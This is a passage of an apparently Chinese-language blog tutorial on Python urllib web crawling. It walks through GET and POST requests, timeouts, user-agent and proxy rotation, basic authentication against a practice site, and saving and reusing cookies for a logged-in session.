class="hljs-string">&quot;pn&quot;</span>:<span class="hljs-string">&quot;80&quot;</span><br>    &#125;<br>    query_str = urllib.parse.urlencode(params)<br>    <span class="hljs-built_in">print</span>(query_str)<br>    final_url = url+query_str<br>    <span class="hljs-built_in">print</span>(final_url)<br><br>    response = urllib.request.urlopen(final_url)<br>    <span class="hljs-comment">#print(response.code)</span><br>    str_data = response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(str_data)  <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;baidu-wukong-pn80.html&#x27;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(str_data)<br>load_baidu_data()<br></code></pre></td></tr></table></figure><h4 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#定义url</span><br><span class="hljs-comment">#用于测试的网站：  http://httpbin.org/post</span><br>url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br><span class="hljs-comment">#创建要发送的数据表单</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;hello&#x27;</span>:<span class="hljs-string">&#x27;world&#x27;</span>,<br>    <span class="hljs-string">&#x27;handsome&#x27;</span>:<span class="hljs-string">&#x27;r1cky&#x27;</span><br>&#125;<br><span class="hljs-comment">#data要进行编码</span><br>data_encode = urllib.parse.urlencode(data).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-comment">#加上encode(&#x27;uft-8&#x27;)  str --&gt; bytes   转换成bytes传输</span><br><span class="hljs-comment">#加上decode(&quot;utf-8&quot;) bytes--&gt;str   转换成str传输</span><br><br><span class="hljs-comment">#发送post请求</span><br>response = urllib.request.urlopen(url=url,data=data_encode)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br></code></pre></td></tr></table></figure><h4 id="超时控制：timeout"><a href="#超时控制：timeout" class="headerlink" title="超时控制：timeout"></a>超时控制：timeout</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#超过0.1秒没有响应就报错</span><br>response = urllib.request.urlopen(url=url,data=data_encode,timeout=<span class="hljs-number">0.1</span>)<br><br><span class="hljs-comment">#异常处理：</span><br><span class="hljs-keyword">try</span>:<br>    response = urllib.request.urlopen(url=url,data=data_encode,timeout=<span class="hljs-number">0.1</span>)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;连接超时&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="自定义user-agent"><a href="#自定义user-agent" class="headerlink" title="自定义user-agent"></a>自定义user-agent</h4><p><strong>爬虫的核心就是模拟用户</strong>！！！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#定义url</span><br><span class="hljs-comment">#用于测试的网站：  http://httpbin.org/post</span><br>url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br><br><span class="hljs-comment">#自定义request  添加user-agent</span><br>header = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>    <span class="hljs-string">&quot;hello&quot;</span>:<span class="hljs-string">&quot;world&quot;</span><br>&#125;<br><br>req = urllib.request.Request(url=url,headers=header,method=<span class="hljs-string">&#x27;POST&#x27;</span>)<br>response = urllib.request.urlopen(req)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h4 id="随机UA头小项目"><a href="#随机UA头小项目" class="headerlink" title="随机UA头小项目"></a>随机UA头小项目</h4><p>每次请求，都切换不同的user-agent</p><p>UA头数据网站：<a href="http://useragent.kuzhazha.com/">UserAgent大全_常用的UserAgent库下载_UserAgent在线工具_流行的UserAgent手机库UA_UA标识网 (kuzhazha.com)</a></p><p>思路：</p><p>1.定义多个ua头 列表</p><p>2.每次请求时切换ua头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user_agent</span>():<br>    url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br>    <span class="hljs-comment">#定义多个user-agent</span><br>    user_agent_list = [<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Linux; Android 12; ELS-AN00 Build/HUAWEIELS-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 XWEB/5075 MMWEBSDK/20230504 MMWEBID/9308 MicroMessenger/8.0.37.2380(0x2800253D) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 MiniProgramEnv/android&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (iPhone; CPU iPhone OS............ile/15E148 MicroMessenger/8.0.34(0x18002234) NetType/4G Language/zh_CN&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; hu; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Int............ecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (X1............7.6) Gecko/20050318 Firefox/1.0.2&quot;</span>,<br>        <span class="hljs-string">&quot;Mozilla/5.0 (Windows; U; Win............o) Chrome/100.0.4896.58 Safari/537.36 UCBrowser/15.4.8.1238&quot;</span>,<br>    ]<br>    <span class="hljs-comment">#使用random模块 随机取user_agent_list中的一个 </span><br>    random_user_agent = random.choice(user_agent_list)<br>    req = urllib.request.Request(url=url,method=<span class="hljs-string">&#x27;POST&#x27;</span>)<br>    <span class="hljs-comment">#添加ua头</span><br>    req.add_header(<span class="hljs-string">&quot;User-Agent&quot;</span>,random_user_agent)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br><br>user_agent()<br></code></pre></td></tr></table></figure><h4 id="自定义opener"><a href="#自定义opener" class="headerlink" title="自定义opener"></a>自定义opener</h4><p>handler：<br>HTTPDefaultErrorHandler 用于处理 HTTP 响应错误，错误都会抛出 HTTPError 类型的异常。<br>HTTPRedirectHandler 用于处理重定向。<br>HTTPCookieProcessor 用于处理 Cookies。<br>ProxyHandler 用于设置代理，默认代理为空。<br>HTTPPasswordMgr 用于管理密码，它维护了用户名密码的表。<br>HTTPBasicAuthHandler 用于管理认证，如果一个链接打开时需要认证，那么可以用它来解决认证问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handler_open</span>():<br>    url = <span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span><br>    <span class="hljs-comment">#创建自己的opener</span><br>    handler = urllib.request.HTTPHandler()<br>    opener = urllib.request.build_opener(handler)<br>    response = opener.<span class="hljs-built_in">open</span>(url)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br>handler_open()<br>    <br></code></pre></td></tr></table></figure><h4 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h4><p>代理的类型：<br>透明：对方可以知道我们的ip<br>匿名：对方不知道我们的ip，but知道我们使用了代理<br>高匿：对方不知道我们的ip，and不知道我们使用了代理</p><p>免费代理 大都不靠谱</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handler_open</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = <span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span><br>        <span class="hljs-comment">#添加代理 ip+端口</span><br>        proxy = &#123;<br>            <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://ip:port&quot;</span><br><br>        &#125;<br>        <span class="hljs-comment">#创建代理处理器</span><br>        proxy_handler = urllib.request.ProxyHandler(proxy)<br>        <span class="hljs-comment">#创建自己的opener</span><br>        opener = urllib.request.build_opener(proxy_handler)<br>        response = opener.<span class="hljs-built_in">open</span>(url)<br>        <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error: &quot;</span>,e)<br><br><br>handler_open()<br></code></pre></td></tr></table></figure><h4 id="随机代理小项目"><a href="#随机代理小项目" class="headerlink" title="随机代理小项目"></a>随机代理小项目</h4><p>代理购买：<a href="https://www.kuaidaili.com/">快代理 - 企业级HTTP代理IP云服务 (kuaidaili.com)</a></p><p>配置代理池：</p><p><img src="/img/image-20230911162945323.png" alt="image-20230911162945323"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy_ip</span>():<br>    url = <span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span><br>    <span class="hljs-comment">#定义多个user-agent</span><br>    ip_list = [<br>        <span class="hljs-string">&quot;http://111.224.217.xxx:19394&quot;</span>,<br>        <span class="hljs-string">&quot;http://114.220.35.xxx:19942&quot;</span>,<br>        <span class="hljs-string">&quot;http://117.87.209.xxx:23350&quot;</span>,<br>        <span class="hljs-string">&quot;http://121.233.172.xxx:22936&quot;</span>,<br>        <span class="hljs-string">&quot;http://182.38.126.xxx:16113&quot;</span><br>    ]<br>    <span class="hljs-comment">#每次取一个ip </span><br>    proxy = random.choice(ip_list)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#创建代理处理器</span><br>        proxy_handler = urllib.request.ProxyHandler(&#123;<span class="hljs-string">&#x27;http&#x27;</span>:proxy,<span class="hljs-string">&#x27;https&#x27;</span>:proxy&#125;)<br>        <span class="hljs-comment">#创建自己的opener</span><br>        opener = urllib.request.build_opener(proxy_handler)<br>        response = opener.<span class="hljs-built_in">open</span>(url)<br>        <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error: &quot;</span>,e)<br><br><br>proxy_ip()<br></code></pre></td></tr></table></figure><img src="/img/image-20230911164947562.png" alt="image-20230911164947562" style="zoom:80%;" /><h4 id="授权认证"><a href="#授权认证" class="headerlink" title="授权认证"></a>授权认证</h4><p>身份认证：</p><p>HTTPBasicAuthHandler（用户基本的身份验证处理）<br>HTTPPasswordMgrWithDefaultRealm（经常和authhandler一起出现）</p><p>需要认证的测试网站：<a href="https://ssr3.scrape.center/">https://ssr3.scrape.center/</a> （admin admin）</p><img src="/img/image-20230911170845042.png" alt="image-20230911170845042" style="zoom:80%;" /><p>直接访问：</p><p><img src="/img/image-20230911170948737.png" alt="image-20230911170948737"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#创建一个密码管理器</span><br>password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()<br><span class="hljs-comment">#添加进目标url，用户名 密码</span><br>password_mgr.add_password(<span class="hljs-literal">None</span>,url,username,password)<br></code></pre></td></tr></table></figure><p>第一个参数为NONE，表示默认的域<br>如果需要添加不同域的凭证可以将none替换为对应的域名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">auth_login</span>():<br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/&quot;</span><br>    <span class="hljs-comment">#指定用户名和密码</span><br>    username = <span class="hljs-string">&quot;admin&quot;</span><br>    password = <span class="hljs-string">&quot;admin&quot;</span><br>    <span class="hljs-comment">#创建密码管理器</span><br>    password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()<br>    <span class="hljs-comment">#添加目标url   用户名 密码</span><br>    password_mgr.add_password(<span class="hljs-literal">None</span>,url,username,password)<br>    <span class="hljs-comment">#创建一个基本密码认证处理器，并将密码管理器传递给他</span><br>    handler = urllib.request.HTTPBasicAuthHandler(password_mgr)<br>    <span class="hljs-comment">#创建网络请求的构造器</span><br>    opener = urllib.request.build_opener(handler)<br>    response = opener.<span class="hljs-built_in">open</span>(url)<br>    <span class="hljs-built_in">print</span>(response.code)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>auth_login()<br></code></pre></td></tr></table></figure><img src="/img/image-20230911170929280.png" alt="image-20230911170929280" style="zoom:80%;" /><h4 id="cookie认证"><a href="#cookie认证" class="headerlink" title="cookie认证"></a>cookie认证</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">auth_login</span>():<br>    url = <span class="hljs-string">&quot;https://ssr3.scrape.center/&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-comment">#添加认证字段 admin:admin</span><br>        <span class="hljs-string">&quot;Authorization&quot;</span>:<span class="hljs-string">&quot;Basic YWRtaW46YWRtaW4=&quot;</span><br>    &#125;<br>    req = urllib.request.Request(url=url,headers=headers)<br>    response = urllib.request.urlopen(req)<br>    <span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>auth_login()<br></code></pre></td></tr></table></figure><h4 id="cookiejar-读写文件"><a href="#cookiejar-读写文件" class="headerlink" title="cookiejar  读写文件"></a>cookiejar  读写文件</h4><p>写：</p><p>MozillaCookieJar  将cookie写进文件<br>可以将cookies保存成Mozilla型浏览器的cookies格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#将cookie写入文件</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> http.cookiejar<br><br>filename = <span class="hljs-string">&#x27;cookies.txt&#x27;</span><br><span class="hljs-comment">#MozillaCookieJar  将cookie写进文件</span><br><span class="hljs-comment">#可以将cookies保存成Mozilla型浏览器的cookies格式</span><br>cookie = http.cookiejar.MozillaCookieJar(filename=filename)<br><span class="hljs-comment">#保存成 libwww-perl(LWP) 格式cookies文件：</span><br><span class="hljs-comment">#cookie = http.cookiejar.LWPCookieJar(filename=filename)</span><br>handler = urllib.request.HTTPCookieProcessor(cookie)<br>opener = urllib.request.build_opener(handler)<br><br>response = opener.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br><br><span class="hljs-comment"># for item in cookie:</span><br><span class="hljs-comment">#     print(item)</span><br><br>cookie.save(ignore_discard=<span class="hljs-literal">True</span>,ignore_expires=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><img src="/img/image-20230911213251107.png" alt="image-20230911213251107" style="zoom: 33%;" /><p>LWP格式：</p><img src="/img/image-20230912094156773.png" alt="image-20230912094156773" style="zoom: 50%;" /><p>读:<br>LWPCookieJar<br>保存成 libwww-perl(LWP) 格式cookies文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#读取cookie  携带该cookie去访问网页</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> http.cookiejar<br><br><br>filename = <span class="hljs-string">&#x27;cookies.txt&#x27;</span><br><span class="hljs-comment">#读：</span><br>cookie = http.cookiejar.LWPCookieJar()<br>cookie.load(filename,ignore_discard=<span class="hljs-literal">True</span>,ignore_expires=<span class="hljs-literal">True</span>)<br>handler = urllib.request.HTTPCookieProcessor(cookie)<br>opener = urllib.request.build_opener(handler)<br><br>response = opener.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><br></code></pre></td></tr></table></figure><h4 id="小项目-–-使用cookie登录网站"><a href="#小项目-–-使用cookie登录网站" class="headerlink" title="小项目 – 使用cookie登录网站"></a>小项目 – 使用cookie登录网站</h4><p>测试网站：<a href="https://www.yaozh.com/login">https://www.yaozh.com/login</a></p><p><img src="/img/image-20230912103624808.png" alt="image-20230912103624808"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> http.cookiejar<br><span class="hljs-keyword">import</span> urllib.parse<br><br><span class="hljs-comment">#1.使用账号密码登录网站</span><br><br><span class="hljs-comment">#登录url：</span><br>url = <span class="hljs-string">&#x27;https://www.yaozh.com/login&#x27;</span><br><br><span class="hljs-comment">#登录的参数：</span><br>login_data = &#123;<br>    <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;pwd&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;pc_vcode&quot;</span>:<span class="hljs-string">&quot;86_zh-CN&quot;</span>,<br>    <span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;mobile&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;vcode&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;pincode&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;formhash&quot;</span>:<span class="hljs-string">&quot;636BCA3396&quot;</span>,<br>    <span class="hljs-string">&quot;backurl&quot;</span>:<span class="hljs-string">&quot;%252F%252Fwww.yaozh.com%252F&quot;</span>,    <br>&#125;<br><span class="hljs-comment">#发送登录请求</span><br>cookie = http.cookiejar.CookieJar()<br>handler = urllib.request.HTTPCookieProcessor()<br>opener = urllib.request.build_opener(handler)<br>headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;</span>,<br><br>    &#125;<br><span class="hljs-comment">#将请求参数转化为bytes</span><br>login_str = urllib.parse.urlencode(login_data).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>req = urllib.request.Request(url=url,headers=headers,data=login_str)<br><span class="hljs-comment">#如果登录成功，cookiejar会自动保存cookie</span><br>opener.<span class="hljs-built_in">open</span>(req)<br><br><span class="hljs-comment">#带着cookie去访问  登录后才能访问的页面</span><br><span class="hljs-comment">#如果请求成功 则表明cookie保存成功</span><br>login_url = <span class="hljs-string">&quot;https://www.yaozh.com/member&quot;</span><br><br>req2 = urllib.request.Request(login_url,headers=headers)<br>response = opener.<span class="hljs-built_in">open</span>(login_url)<br>data = response.read()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cookie.html&#x27;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(data)<br></code></pre></td></tr></table></figure><img src="/img/image-20230912103538210.png" alt="image-20230912103538210" style="zoom:67%;" /><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>防止程序健壮性较差  </p><p>urllib的error模块：</p><p>urlerror：继承OSError</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br><br><span class="hljs-keyword">except</span> error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)  <span class="hljs-comment">#打印错误原因</span><br>    <br>测试：<br><span 